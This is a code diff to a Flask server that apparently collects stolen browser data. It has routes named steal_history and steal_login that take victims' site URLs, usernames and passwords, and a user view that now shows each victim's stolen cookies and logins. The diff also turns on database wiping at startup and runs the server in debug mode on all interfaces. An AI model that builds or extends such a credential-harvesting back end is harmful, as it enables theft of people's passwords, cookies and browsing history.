@@ -32,7 +32,9 @@ def steal_history():
 @app.route("/view_user/<email>", methods=['GET'])
 def view_user(email):
     hist = history.get_history_by_user(email)
-    return render_template('user.html', email=email, history=hist)
+    cook = cookies.get_cookies_by_user(email)
+    logs = login.get_logins_by_user(email)
+    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs)
 
 @app.route('/addSecure/<email>', methods=['POST'])
 def add_secure(email):
@@ -76,7 +78,7 @@ def steal_login():
         url = request.form['url']
         username = request.form['username']
         password = request.form['password']
-        login.addToLogin(email, url, username, password)
+        login.add_to_login(email, url, username, password)
         return "we all good here"
 
 
@@ -95,12 +97,12 @@ if __name__ == "__main__":
     app.config['TEMPLATES_AUTO_RELOAD'] = True
 
     # uncomment this if you want to erase all tables
-    # general_db.drop_all_tables()
+    general_db.drop_all_tables()
 
     # uncomment this if you want to create all tables
     general_db.create_all_tables()
 
     # uncomment this time if you want to erase the data
-    # general_db.delete_db()
+    general_db.delete_db()
 
-    app.run(host='localhost', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=5000, debug=True)
